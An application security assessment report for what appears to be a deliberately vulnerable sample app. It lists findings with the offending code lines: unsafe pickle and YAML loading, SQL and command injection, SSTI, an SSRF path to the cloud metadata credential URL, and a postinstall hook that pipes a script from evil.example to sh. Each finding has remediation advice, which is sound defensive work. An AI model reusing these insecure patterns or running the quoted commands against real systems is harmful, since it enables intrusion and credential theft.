# Application Security Assessment — vulnerable-fixture

| Field | Value |
|---|---|
| Mode | `comprehensive` |
| Engine | appsec-assurance 1.0.1 |
| Files scanned | 11 |
| Manual review merged | yes |

> **Assurance statement.** This assessment reduces risk; it does not prove the absence of vulnerabilities. Passing automated checks is not evidence that the application is secure. Areas listed under *Untested areas and limitations* were not assessed and must not be assumed safe.

## 1. Executive summary

This sample application is not fit for deployment. Unauthenticated users can execute code on the server (unsafe deserialization, command injection), read the database (SQL injection), and pivot from an SSRF flaw to cloud credentials because the instance allows IMDSv1. The CI workflow lets anyone who opens a pull request run code with repository secrets. Fix the five immediate items first, rotate every credential found in the repository, then address the infrastructure exposure.

## 2. Overall security posture

**Risk indicator: CRITICAL** — Critical risk: at least one confirmed critical issue or critical attack path.

Critical. Multiple independent pre-authentication code-execution paths were confirmed by static tracing, and no authentication layer exists on any HTTP route. Runtime testing was not performed.

| Severity | critical | high | medium | low | info |
|---|---|---|---|---|---|
| Open | 2 | 28 | 20 | 10 | 0 |

Status counts (all findings): accepted-risk: 1, confirmed: 3, missing-control: 8, suspected: 4, unverified: 45

## 3. Technologies and components assessed

- **Languages:** javascript (2), python (2), hcl (1)
- **Frameworks:** express, flask
- **Package managers:** npm, pip; missing lockfiles: npm
- **Data stores:** none detected
- **Containers / IaC / cloud:** docker, kubernetes, terraform, aws
- **CI/CD:** github-actions; **Mobile:** none detected

**Attack-surface inventory (regex-derived, see inventory.json):** auth: 3, ci-pipeline: 1, crypto: 1, db-query: 3, deserialization: 2, dockerfile: 1, env-file: 1, file-access: 2, http-route: 14, outbound-http: 3, redirect: 1, subprocess: 3, template-render: 3, terraform: 1

- Client -> server API boundary: every route/resolver needs authn + object/function-level authz review.
- Application -> datastore boundary: verify parameterization and least-privilege DB credentials.
- Server -> external network boundary: check SSRF controls, TLS verification, timeouts, and unsafe consumption of third-party responses.
- Application -> OS boundary: verify no untrusted input reaches shell/exec arguments.
- Application -> filesystem boundary: path traversal, upload validation, storage outside webroot.
- Untrusted data -> object graph boundary: deserialization of attacker-controlled bytes.
- Contributor -> CI -> cloud/registry boundary: workflow triggers, token permissions, secret exposure.

## 4. Standards and coverage

### OWASP Top 10 (2021) mapping

| Category | Open findings |
|---|---|
| A01:2021 Broken Access Control | 7 |
| A02:2021 Cryptographic Failures | 3 |
| A03:2021 Injection | 9 |
| A04:2021 Insecure Design | 0 |
| A05:2021 Security Misconfiguration | 14 |
| A06:2021 Vulnerable and Outdated Components | 4 |
| A07:2021 Identification and Authentication Failures | 9 |
| A08:2021 Software and Data Integrity Failures | 15 |
| A09:2021 Security Logging and Monitoring Failures | 0 |
| A10:2021 Server-Side Request Forgery | 2 |

_A zero means no open finding was mapped to the category, not that the category was fully tested._

### Check ledger

| Area | Check | Kind | Status | Findings | Notes |
|---|---|---|---|---|---|
| authentication | Authentication flows: login, reset, MFA, session lifecycle (checklists/authentication.md, session-jwt-oauth.md) | manual | **skipped** | 0 | requires analyst review (SKILL.md phases 3-7) |
| authorization | Object/function-level authorization (BOLA/IDOR/BFLA) on every route - requires code tracing (checklists/authorization.md) | manual | **skipped** | 0 | requires analyst review (SKILL.md phases 3-7) |
| business-logic | Business logic, race conditions and transaction integrity (checklists/business-logic-and-race-conditions.md) | manual | **skipped** | 0 | requires analyst review (SKILL.md phases 3-7) |
| cicd | zizmor | tool | **skipped** | 0 | --no-tools given |
| data-flow | Source-to-sink data-flow tracing across components | manual | **skipped** | 0 | requires analyst review (SKILL.md phases 3-7) |
| iac | checkov | tool | **skipped** | 0 | --no-tools given |
| iac | hadolint | tool | **skipped** | 0 | --no-tools given |
| inventory | attack-surface-inventory | builtin | **ran** | 0 |  |
| privacy | Data classification, retention, backups and disaster recovery (checklists/privacy-and-data-protection.md) | manual | **skipped** | 0 | requires analyst review (SKILL.md phases 3-7) |
| rules | pack:auth | builtin | **ran** | 3 | 10 rules, 0 unreadable files |
| rules | pack:cicd | builtin | **ran** | 4 | 8 rules, 0 unreadable files |
| rules | pack:config | builtin | **ran** | 6 | 14 rules, 0 unreadable files |
| rules | pack:crypto | builtin | **ran** | 2 | 9 rules, 0 unreadable files |
| rules | pack:deserialization | builtin | **ran** | 2 | 9 rules, 0 unreadable files |
| rules | pack:iac | builtin | **ran** | 15 | 22 rules, 0 unreadable files |
| rules | pack:injection | builtin | **ran** | 10 | 28 rules, 0 unreadable files |
| rules | pack:secrets | builtin | **ran** | 3 | 13 rules, 0 unreadable files |
| rules | pack:supply-chain | builtin | **ran** | 9 | 13 rules, 0 unreadable files |
| rules | pack:xss | builtin | **ran** | 2 | 13 rules, 0 unreadable files |
| runtime | Runtime behaviour, deployed configuration and infrastructure state (needs authorized DAST/cloud review) | manual | **skipped** | 0 | requires analyst review (SKILL.md phases 3-7) |
| sast | bandit | tool | **skipped** | 0 | --no-tools given |
| sast | brakeman | tool | **skipped** | 0 | --no-tools given |
| sast | gosec | tool | **skipped** | 0 | --no-tools given |
| sast | semgrep | tool | **skipped** | 0 | --no-tools given |
| sca | known-vulnerability-lookup | builtin | **unavailable** | 0 | no SCA source ran - dependency CVEs were NOT checked. Install osv-scanner/trivy or use --osv-api. |
| sca | osv-api | builtin | **skipped** | 0 | opt-in: pass --osv-api (sends package names/versions to api.osv.dev) |
| sca | govulncheck | tool | **skipped** | 0 | --no-tools given |
| sca | npm-audit | tool | **skipped** | 0 | --no-tools given |
| sca | osv-scanner | tool | **skipped** | 0 | --no-tools given |
| sca | pip-audit | tool | **skipped** | 0 | --no-tools given |
| sca+iac | trivy | tool | **skipped** | 0 | --no-tools given |
| secrets | git-tracked-sensitive-files | builtin | **not-applicable** | 0 | not a git repository |
| secrets | gitleaks | tool | **skipped** | 0 | --no-tools given |
| supply-chain | installed-npm-install-hooks | builtin | **skipped** | 0 | runs in deep mode only (mode=comprehensive) |
| supply-chain | lockfiles+typosquat-heuristic | builtin | **ran** | 4 |  |
| threat-model | Threat model and attack-path chaining (references/threat-modeling.md) | manual | **skipped** | 0 | requires analyst review (SKILL.md phases 3-7) |

### Manual checklist results

| Checklist | pass | fail | n/a | untested |
|---|---|---|---|---|
| authorization.md | 0 | 1 | 0 | 0 |
| business-logic-and-race-conditions.md | 0 | 0 | 1 | 0 |
| injection.md | 0 | 1 | 0 | 0 |
| logging-monitoring-and-audit.md | 0 | 0 | 0 | 1 |
| mobile.md | 0 | 0 | 1 | 0 |
| ssrf-and-outbound.md | 0 | 1 | 0 | 0 |

## 5. Attack paths

### AP-1: Anonymous SSRF to AWS credential theft (critical)

Chain: AUTO-0011 → AUTO-0037 → MAN-001

GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> is fetched server-side (app.py:35). Terraform allows IMDSv1 (infra/main.tf:25), so no session token is required and the role's temporary credentials are returned to the attacker. No authentication protects the route (MAN-001). Not validated at runtime; static chain only.

## 6. Findings

| ID | Severity | Status | Confidence | Title | Location |
|---|---|---|---|---|---|
| [AUTO-0001](#auto-0001) | critical | unverified | high | pull_request_target checks out untrusted PR code | `.github/workflows/ci.yml:3` |
| [AUTO-0012](#auto-0012) | critical | confirmed | high | Unsafe Python deserialization (pickle and friends) | `app.py:45` |
| [AUTO-0002](#auto-0002) | high | unverified | medium | Credentials embedded in connection URL | `.env:1` |
| [AUTO-0003](#auto-0003) | high | unverified | high | GitHub token in source | `.env:2` |
| [AUTO-0004](#auto-0004) | high | unverified | medium | Untrusted GitHub context expanded in workflow script | `.github/workflows/ci.yml:13` |
| [AUTO-0005](#auto-0005) | high | unverified | medium | Secret passed via ENV/ARG in image | `Dockerfile:3` |
| [AUTO-0006](#auto-0006) | high | unverified | medium | Hardcoded framework secret key | `app.py:11` |
| [AUTO-0007](#auto-0007) | high | unverified | high | AWS access key ID in source | `app.py:12` |
| [MAN-001](#man-001) | high | missing-control | high | No authentication or authorization on any HTTP route | `app.py:16` |
| [AUTO-0008](#auto-0008) | high | confirmed | high | SQL built with string formatting (Python) | `app.py:19` |
| [AUTO-0009](#auto-0009) | high | unverified | medium | subprocess with shell=True | `app.py:25` |
| [AUTO-0010](#auto-0010) | high | unverified | medium | Template rendered from a dynamic string (SSTI) | `app.py:30` |
| [AUTO-0011](#auto-0011) | high | confirmed | high | Outbound request to user-controlled URL (Python) | `app.py:35` |
| [AUTO-0013](#auto-0013) | high | unverified | medium | Unsafe YAML load (Python) | `app.py:50` |
| [AUTO-0014](#auto-0014) | high | unverified | medium | Request data used in filesystem path (Python) | `app.py:55` |
| [AUTO-0015](#auto-0015) | high | unverified | high | TLS certificate verification disabled | `app.py:59` |
| [AUTO-0016](#auto-0016) | high | unverified | medium | Flask/Werkzeug debugger enabled | `app.py:60` |
| [AUTO-0017](#auto-0017) | high | unverified | high | Object storage publicly accessible | `infra/main.tf:14` |
| [AUTO-0018](#auto-0018) | high | unverified | high | Object storage publicly accessible | `infra/main.tf:15` |
| [AUTO-0019](#auto-0019) | high | unverified | high | Database publicly accessible | `infra/main.tf:19` |
| [AUTO-0020](#auto-0020) | high | unverified | medium | Hardcoded password in infrastructure code | `infra/main.tf:21` |
| [AUTO-0021](#auto-0021) | high | unverified | high | Pod shares host network/PID/IPC namespace | `k8s/deployment.yaml:8` |
| [AUTO-0022](#auto-0022) | high | unverified | high | Privileged container | `k8s/deployment.yaml:13` |
| [AUTO-0023](#auto-0023) | high | suspected | medium | Install lifecycle script with network/eval/encoded payload | `package.json:5` |
| [AUTO-0024](#auto-0024) | high | suspected | medium | Execution of decoded/obfuscated payload | `public/app.js:3` |
| [AUTO-0025](#auto-0025) | high | unverified | medium | SQL built with template literal or concatenation (JS/TS) | `server.js:8` |
| [AUTO-0026](#auto-0026) | high | unverified | medium | child_process exec with dynamic string | `server.js:12` |
| [AUTO-0027](#auto-0027) | high | unverified | medium | Request data written directly to HTML response | `server.js:16` |
| [AUTO-0028](#auto-0028) | high | unverified | medium | JWT signed/verified with hardcoded secret | `server.js:26` |
| [AUTO-0029](#auto-0029) | high | unverified | medium | Request data used in filesystem path (JS) | `server.js:30` |
| [AUTO-0030](#auto-0030) | medium | unverified | medium | Environment file with values in repository | `.env:1` |
| [AUTO-0031](#auto-0031) | medium | missing-control | high | Container runs as root (no non-root USER) | `Dockerfile:1` |
| [AUTO-0032](#auto-0032) | medium | unverified | high | ADD fetches remote URL | `Dockerfile:2` |
| [AUTO-0033](#auto-0033) | medium | unverified | high | Remote script piped to shell | `Dockerfile:5` |
| [AUTO-0034](#auto-0034) | medium | unverified | medium | Redirect to user-controlled location | `app.py:40` |
| [AUTO-0035](#auto-0035) | medium | unverified | medium | Network rule open to the internet (0.0.0.0/0 or ::/0) | `infra/main.tf:8` |
| [AUTO-0036](#auto-0036) | medium | unverified | high | Encryption at rest or key rotation disabled | `infra/main.tf:20` |
| [AUTO-0037](#auto-0037) | medium | unverified | high | EC2 instance metadata v1 allowed | `infra/main.tf:25` |
| [AUTO-0038](#auto-0038) | medium | missing-control | medium | Workload without runAsNonRoot | `k8s/deployment.yaml:2` |
| [AUTO-0039](#auto-0039) | medium | unverified | high | allowPrivilegeEscalation enabled | `k8s/deployment.yaml:14` |
| [AUTO-0040](#auto-0040) | medium | suspected | low | Dependency 'lodahs' resembles popular package 'lodash' | `package.json:12` |
| [AUTO-0041](#auto-0041) | medium | unverified | medium | Dependency fetched from git/URL/file instead of registry | `package.json:13` |
| [AUTO-0042](#auto-0042) | medium | unverified | low | Assignment to innerHTML/outerHTML | `public/app.js:2` |
| [AUTO-0043](#auto-0043) | medium | unverified | medium | eval / new Function / string timers (JS) | `public/app.js:3` |
| [AUTO-0044](#auto-0044) | medium | suspected | low | Dependency 'reqeusts' resembles popular package 'requests' | `requirements.txt:4` |
| [AUTO-0045](#auto-0045) | medium | unverified | medium | Additional package index (dependency confusion risk) | `requirements.txt:5` |
| [AUTO-0046](#auto-0046) | medium | unverified | medium | CORS allows any origin | `server.js:5` |
| [AUTO-0047](#auto-0047) | medium | unverified | medium | Request body bound directly to a model | `server.js:20` |
| [AUTO-0048](#auto-0048) | medium | unverified | low | jsonwebtoken decode() does not verify signatures | `server.js:25` |
| [AUTO-0049](#auto-0049) | medium | unverified | medium | Non-cryptographic RNG used for security value | `server.js:27` |
| [AUTO-0050](#auto-0050) | low | missing-control | high | Workflow without explicit token permissions | `.github/workflows/ci.yml:5` |
| [AUTO-0051](#auto-0051) | low | unverified | high | Third-party GitHub Action not pinned to a commit SHA | `.github/workflows/ci.yml:12` |
| [AUTO-0052](#auto-0052) | low | unverified | high | Base image unpinned or :latest | `Dockerfile:1` |
| [AUTO-0053](#auto-0053) | low | missing-control | medium | Workload without resource limits | `k8s/deployment.yaml:2` |
| [AUTO-0054](#auto-0054) | low | missing-control | high | No lockfile for npm dependencies | `package.json` |
| [AUTO-0055](#auto-0055) | low | missing-control | medium | Express app without security headers middleware | `package.json:9` |
| [AUTO-0056](#auto-0056) | low | missing-control | low | No rate limiting library detected (Node) | `package.json:9` |
| [AUTO-0057](#auto-0057) | low | unverified | high | Dependency version wildcard or 'latest' | `package.json:10` |
| [AUTO-0058](#auto-0058) | low | unverified | medium | Unpinned Python requirement | `requirements.txt:1` |
| [AUTO-0059](#auto-0059) | low | unverified | medium | Unpinned Python requirement | `requirements.txt:2` |

### AUTO-0001

**pull_request_target checks out untrusted PR code**

- **Severity:** critical · **CVSS 3.1:** 10.0 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`)
- **Status / confidence:** unverified / high
- **Location:** `.github/workflows/ci.yml:3`
- **Classification:** CWE-829, A08:2021
- **Detected by:** builtin:cicd · rule `CI-GHA-PRT-UNTRUSTED-CHECKOUT` · fingerprint `d5028719e93c5c1e763d`

```
pull_request_target:
```

**Evidence.** Matched 2 required signal(s).

**Remediation.** Do not check out or run PR head code in pull_request_target; use pull_request, or split into an unprivileged build + privileged workflow_run.

### AUTO-0012

**Unsafe Python deserialization (pickle and friends)**

- **Severity:** critical · **CVSS 3.1:** 9.8 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Status / confidence:** confirmed / high
- **Location:** `app.py:45`
- **Classification:** CWE-502, A08:2021
- **Detected by:** builtin:deserialization · rule `DES-PY-PICKLE` · fingerprint `0a0d3c3601a492ea2c26`

```
return str(pickle.loads(request.data))
```

**Evidence.** Line matches pattern for DES-PY-PICKLE.

**Triage note.** request.data passed straight to pickle.loads on an unauthenticated POST route: pre-auth RCE by construction.

**Remediation.** Never unpickle untrusted data; use JSON or a schema-validated format. Sign data with HMAC if pickle is unavoidable.

### AUTO-0002

**Credentials embedded in connection URL**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `.env:1`
- **Classification:** CWE-798, A07:2021
- **Detected by:** builtin:secrets · rule `SEC-CONN-STRING-CREDS` · fingerprint `c09444a6e6f14d709570`

```
DATABASE_URL=postgres://admin:Pr0d…[redacted 11 chars]@db.internal:********
```

**Evidence.** Value Pr0d…[redacted 11 chars] (entropy 3.46). Secret redacted; it was not used or validated.

**Remediation.** Move the connection string to a secret store / environment variable and rotate the database password.

### AUTO-0003

**GitHub token in source**

- **Severity:** high
- **Status / confidence:** unverified / high
- **Location:** `.env:2`
- **Classification:** CWE-798, A07:2021
- **Detected by:** builtin:secrets · rule `SEC-GITHUB-TOKEN` · fingerprint `6995595c6a88f0193860`

```
GITHUB_TOKEN=ghp_…[redacted 40 chars]
```

**Evidence.** Value ghp_…[redacted 40 chars] (entropy 5.07). Secret redacted; it was not used or validated.

**Remediation.** Revoke the token in GitHub settings, review the audit log, and use GITHUB_TOKEN or a secrets store.

### AUTO-0004

**Untrusted GitHub context expanded in workflow script**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `.github/workflows/ci.yml:13`
- **Classification:** CWE-78, CWE-94, A03:2021, A08:2021
- **Detected by:** builtin:cicd · rule `CI-GHA-SCRIPT-INJECTION` · fingerprint `1b61f6dce44e7377219b`

```
- run: echo "Issue: ${{ github.event.issue.title }}"
```

**Evidence.** Line matches pattern for CI-GHA-SCRIPT-INJECTION.

**Remediation.** Pass the value through an env var (env: TITLE: ${{ github.event.issue.title }}) and reference "$TITLE" in the script.

### AUTO-0005

**Secret passed via ENV/ARG in image**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `Dockerfile:3`
- **Classification:** CWE-798, CWE-538, A05:2021
- **Detected by:** builtin:iac · rule `IAC-DOCKER-SECRET-IN-LAYER` · fingerprint `32e845d01dbad46e0681`

```
ENV DB_PASSWORD=supe…[redacted 14 chars]
```

**Evidence.** Line matches pattern for IAC-DOCKER-SECRET-IN-LAYER.

**Remediation.** Use BuildKit secrets (RUN --mount=type=secret) and inject runtime secrets via the orchestrator.

### AUTO-0006

**Hardcoded framework secret key**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `app.py:11`
- **Classification:** CWE-798, A07:2021
- **Detected by:** builtin:config · rule `CFG-HARDCODED-APP-SECRET` · fingerprint `f2f6c485b41dcbd67dd8`

```
app.config["SECRET_KEY"] = "s3cr…[redacted 28 chars]"
```

**Evidence.** Value s3cr…[redacted 28 chars] (entropy 3.84). Secret redacted; it was not used or validated.

**Remediation.** Load SECRET_KEY / session secrets from the environment or secrets manager; rotate the exposed value (this invalidates sessions/signatures).

### AUTO-0007

**AWS access key ID in source**

- **Severity:** high · **CVSS 3.1:** 9.1 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Status / confidence:** unverified / high
- **Location:** `app.py:12`
- **Classification:** CWE-798, A07:2021
- **Detected by:** builtin:secrets · rule `SEC-AWS-ACCESS-KEY` · fingerprint `af55fd400e92f8109063`

```
AWS_ACCESS_KEY_ID = "AKIA…[redacted 20 chars]"
```

**Description.** Hardcoded cloud credentials can be harvested from source, history, packages and build artifacts.

**Evidence.** Value AKIA…[redacted 20 chars] (entropy 4.12). Secret redacted; it was not used or validated.

**Remediation.** Remove the key, rotate it in IAM immediately, audit CloudTrail for its use, and load credentials from the environment, an instance/workload role, or a secrets manager.

### MAN-001

**No authentication or authorization on any HTTP route**

- **Severity:** high
- **Status / confidence:** missing-control / high
- **Location:** `app.py:16`
- **Classification:** CWE-306, CWE-862, A01:2021, A07:2021, API2:2023
- **Detected by:** manual-review · rule `MANUAL-MAN-001` · fingerprint `372a9b414328e581007c`

**Description.** All ten Flask routes and all Express routes are reachable without a session or token; there is no auth middleware, decorator or gateway configuration in the repository.

**Evidence.** app.py defines @app.route handlers with no login_required/before_request hook; server.js mounts handlers directly on `app` with no auth middleware; no gateway/ingress auth config present.

**Impact.** Every other weakness is reachable by anonymous internet users, raising each to its pre-auth severity.

**Remediation.** Introduce a default-deny authentication layer (before_request hook / Express middleware mounted before routes), then per-route authorization checks; add a test that enumerates routes and asserts 401 without credentials.

**Regression test.**

```
def test_all_routes_require_auth(client):
    for rule in app.url_map.iter_rules():
        if rule.endpoint == 'static':
            continue
        assert client.get(rule.rule).status_code in (401, 403)
```

### AUTO-0008

**SQL built with string formatting (Python)**

- **Severity:** high · **CVSS 3.1:** 9.8 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Status / confidence:** confirmed / high
- **Location:** `app.py:19`
- **Classification:** CWE-89, A03:2021
- **Detected by:** builtin:injection · rule `INJ-PY-SQL-STRING` · fingerprint `d1857e575972946766e7`

```
return str(conn.execute(f"SELECT * FROM users WHERE id = {uid}").fetchall())
```

**Evidence.** Line matches pattern for INJ-PY-SQL-STRING.

**Triage note.** Traced: request.args['id'] (app.py:17) -> f-string -> conn.execute (app.py:19); no validation or parameterization on the path.

**Remediation.** Use parameterized queries (cursor.execute(sql, params)) or ORM query builders; never interpolate untrusted values into SQL.

### AUTO-0009

**subprocess with shell=True**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `app.py:25`
- **Classification:** CWE-78, A03:2021
- **Detected by:** builtin:injection · rule `INJ-PY-SHELL-TRUE` · fingerprint `2ae19806b7574fc79f64`

```
return subprocess.check_output("ping -c 1 " + host, shell=True)
```

**Evidence.** Line matches pattern for INJ-PY-SHELL-TRUE.

**Remediation.** Pass an argument list with shell=False; if a shell is unavoidable, use shlex.quote on every untrusted value.

### AUTO-0010

**Template rendered from a dynamic string (SSTI)**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `app.py:30`
- **Classification:** CWE-1336, A03:2021
- **Detected by:** builtin:injection · rule `INJ-PY-SSTI` · fingerprint `aa65b78956c88ca2c4de`

```
return render_template_string("<h1>Hello " + request.args.get("name", "") + "</h1>")
```

**Evidence.** Line matches pattern for INJ-PY-SSTI.

**Remediation.** Render fixed template files and pass user data as context variables; never build template source from input.

### AUTO-0011

**Outbound request to user-controlled URL (Python)**

- **Severity:** high · **CVSS 3.1:** 8.6 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
- **Status / confidence:** confirmed / high
- **Location:** `app.py:35`
- **Classification:** CWE-918, A10:2021
- **Detected by:** builtin:injection · rule `INJ-SSRF-PY` · fingerprint `189b0ca7d311a170dc35`

```
return requests.get(request.args["url"], timeout=5).text
```

**Evidence.** Line matches pattern for INJ-SSRF-PY.

**Triage note.** request.args['url'] reaches requests.get with no scheme/host allowlist; see AP-1.

**Remediation.** Validate the URL against an allowlist of hosts/schemes, resolve and block private/link-local ranges (incl. 169.254.169.254), disable redirects or re-validate them.

### AUTO-0013

**Unsafe YAML load (Python)**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `app.py:50`
- **Classification:** CWE-502, A08:2021
- **Detected by:** builtin:deserialization · rule `DES-PY-YAML-UNSAFE` · fingerprint `a396d29b649836a2d8ee`

```
return str(yaml.load(request.data))
```

**Evidence.** Line matches pattern for DES-PY-YAML-UNSAFE.

**Remediation.** Use yaml.safe_load or Loader=yaml.SafeLoader.

### AUTO-0014

**Request data used in filesystem path (Python)**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `app.py:55`
- **Classification:** CWE-22, A01:2021
- **Detected by:** builtin:injection · rule `INJ-PATH-TRAVERSAL-PY` · fingerprint `13736063f0635789576b`

```
return open(os.path.join("files", request.args["name"])).read()
```

**Evidence.** Line matches pattern for INJ-PATH-TRAVERSAL-PY.

**Remediation.** Use werkzeug.utils.safe_join / send_from_directory, or resolve and verify the path stays under the base directory.

### AUTO-0015

**TLS certificate verification disabled**

- **Severity:** high · **CVSS 3.1:** 6.8 (`CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Status / confidence:** unverified / high
- **Location:** `app.py:59`
- **Classification:** CWE-295, A02:2021
- **Detected by:** builtin:crypto · rule `CRY-TLS-VERIFY-DISABLED` · fingerprint `9d265703cc0a5d6140dd`

```
requests.get("https://internal.example", verify=False)
```

**Evidence.** Line matches pattern for CRY-TLS-VERIFY-DISABLED.

**Remediation.** Keep certificate and hostname verification on; trust a private CA bundle explicitly if needed.

### AUTO-0016

**Flask/Werkzeug debugger enabled**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `app.py:60`
- **Classification:** CWE-489, CWE-94, A05:2021
- **Detected by:** builtin:config · rule `CFG-FLASK-DEBUG` · fingerprint `312b6676e76664ef8f91`

```
app.run(host="0.0.0.0", debug=True)
```

**Evidence.** Line matches pattern for CFG-FLASK-DEBUG.

**Remediation.** Never enable debug outside local development; the Werkzeug console allows code execution.

### AUTO-0017

**Object storage publicly accessible**

- **Severity:** high
- **Status / confidence:** unverified / high
- **Location:** `infra/main.tf:14`
- **Classification:** CWE-284, A01:2021
- **Detected by:** builtin:iac · rule `IAC-TF-PUBLIC-BUCKET` · fingerprint `a24a4c01cb3c95462cb0`

```
block_public_acls   = false
```

**Evidence.** Line matches pattern for IAC-TF-PUBLIC-BUCKET.

**Remediation.** Enable S3 Block Public Access (all four settings), remove public ACLs, and serve public content via CloudFront with OAC.

### AUTO-0018

**Object storage publicly accessible**

- **Severity:** high
- **Status / confidence:** unverified / high
- **Location:** `infra/main.tf:15`
- **Classification:** CWE-284, A01:2021
- **Detected by:** builtin:iac · rule `IAC-TF-PUBLIC-BUCKET` · fingerprint `8f1516e0b8c25fb30ee6`

```
block_public_policy = false
```

**Evidence.** Line matches pattern for IAC-TF-PUBLIC-BUCKET.

**Remediation.** Enable S3 Block Public Access (all four settings), remove public ACLs, and serve public content via CloudFront with OAC.

### AUTO-0019

**Database publicly accessible**

- **Severity:** high
- **Status / confidence:** unverified / high
- **Location:** `infra/main.tf:19`
- **Classification:** CWE-284, A05:2021
- **Detected by:** builtin:iac · rule `IAC-DB-PUBLICLY-ACCESSIBLE` · fingerprint `c4054fcf9fbf64b050dc`

```
publicly_accessible = true
```

**Evidence.** Line matches pattern for IAC-DB-PUBLICLY-ACCESSIBLE.

**Remediation.** Set publicly_accessible = false and place databases in private subnets.

### AUTO-0020

**Hardcoded password in infrastructure code**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `infra/main.tf:21`
- **Classification:** CWE-798, A07:2021
- **Detected by:** builtin:iac · rule `IAC-HARDCODED-PASSWORD` · fingerprint `b67050428fabbc644950`

```
password            = "hunt…[redacted 14 chars]"
```

**Evidence.** Value hunt…[redacted 14 chars] (entropy 2.81). Secret redacted; it was not used or validated.

**Remediation.** Use a secrets manager reference or a generated random_password; mark variables sensitive.

### AUTO-0021

**Pod shares host network/PID/IPC namespace**

- **Severity:** high
- **Status / confidence:** unverified / high
- **Location:** `k8s/deployment.yaml:8`
- **Classification:** CWE-250, A05:2021
- **Detected by:** builtin:iac · rule `IAC-K8S-HOST-NAMESPACE` · fingerprint `5cadf6a6c7cde4f41b5f`

```
hostNetwork: true
```

**Evidence.** Line matches pattern for IAC-K8S-HOST-NAMESPACE.

**Remediation.** Remove hostNetwork/hostPID/hostIPC unless it is a vetted node-level agent.

### AUTO-0022

**Privileged container**

- **Severity:** high
- **Status / confidence:** unverified / high
- **Location:** `k8s/deployment.yaml:13`
- **Classification:** CWE-250, A05:2021
- **Detected by:** builtin:iac · rule `IAC-PRIVILEGED-CONTAINER` · fingerprint `a638ee08860b66a42403`

```
privileged: true
```

**Evidence.** Line matches pattern for IAC-PRIVILEGED-CONTAINER.

**Remediation.** Remove privileged mode; grant only specific capabilities if strictly needed.

### AUTO-0023

**Install lifecycle script with network/eval/encoded payload**

- **Severity:** high
- **Status / confidence:** suspected / medium
- **Location:** `package.json:5`
- **Classification:** CWE-506, CWE-829, A08:2021
- **Detected by:** builtin:supply-chain · rule `SC-INSTALL-SCRIPT-SUSPICIOUS` · fingerprint `bb8eda3867e4a012aea4`

```
"postinstall": "curl -s https://evil.example/install.sh | sh",
```

**Evidence.** Line matches pattern for SC-INSTALL-SCRIPT-SUSPICIOUS.

**Remediation.** Inspect the script statically (do NOT run it). Remove it or replace with an auditable build step; install with --ignore-scripts in CI.

### AUTO-0024

**Execution of decoded/obfuscated payload**

- **Severity:** high
- **Status / confidence:** suspected / medium
- **Location:** `public/app.js:3`
- **Classification:** CWE-506, A08:2021
- **Detected by:** builtin:supply-chain · rule `SC-OBFUSCATED-EXEC` · fingerprint `828f528b189d08602241`

```
eval(atob(params.get("payload")));
```

**Evidence.** Line matches pattern for SC-OBFUSCATED-EXEC.

**Remediation.** Treat as potentially malicious: do not run it. Decode statically, identify origin (git blame/package), and remove or replace the component.

### AUTO-0025

**SQL built with template literal or concatenation (JS/TS)**

- **Severity:** high · **CVSS 3.1:** 9.8 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Status / confidence:** unverified / medium
- **Location:** `server.js:8`
- **Classification:** CWE-89, A03:2021
- **Detected by:** builtin:injection · rule `INJ-JS-SQL-STRING` · fingerprint `b0ca6b33d1c14f1e5b8b`

```
db.query(`SELECT * FROM items WHERE name = '${req.query.q}'`, (e, rows) => res.json(rows));
```

**Evidence.** Line matches pattern for INJ-JS-SQL-STRING.

**Remediation.** Use placeholders ($1, ?) with a values array, tagged templates (sql``, Prisma.sql), or the query builder.

### AUTO-0026

**child_process exec with dynamic string**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `server.js:12`
- **Classification:** CWE-78, A03:2021
- **Detected by:** builtin:injection · rule `INJ-JS-CHILD-PROCESS-STRING` · fingerprint `cb5a768108199db2b941`

```
exec(`convert ${req.query.file} out.png`, () => res.send("ok"));
```

**Evidence.** Line matches pattern for INJ-JS-CHILD-PROCESS-STRING.

**Remediation.** Use execFile/spawn with an argument array and no shell; validate inputs against an allowlist.

### AUTO-0027

**Request data written directly to HTML response**

- **Severity:** high · **CVSS 3.1:** 6.1 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
- **Status / confidence:** unverified / medium
- **Location:** `server.js:16`
- **Classification:** CWE-79, A03:2021
- **Detected by:** builtin:xss · rule `XSS-REFLECTED-SEND` · fingerprint `aa4ea01d55513ff58615`

```
res.send(`<p>Welcome ${req.query.name}</p>`);
```

**Evidence.** Line matches pattern for XSS-REFLECTED-SEND.

**Remediation.** Encode output for the HTML context or render through an auto-escaping template; set Content-Type correctly.

### AUTO-0028

**JWT signed/verified with hardcoded secret**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `server.js:26`
- **Classification:** CWE-798, CWE-321, A07:2021
- **Detected by:** builtin:auth · rule `AUTH-JWT-HARDCODED-SECRET` · fingerprint `a0d24d2917f772b70045`

```
const token = jwt.sign({ id: 1 }, "hard…[redacted 26 chars]");
```

**Evidence.** Value hard…[redacted 26 chars] (entropy 3.72). Secret redacted; it was not used or validated.

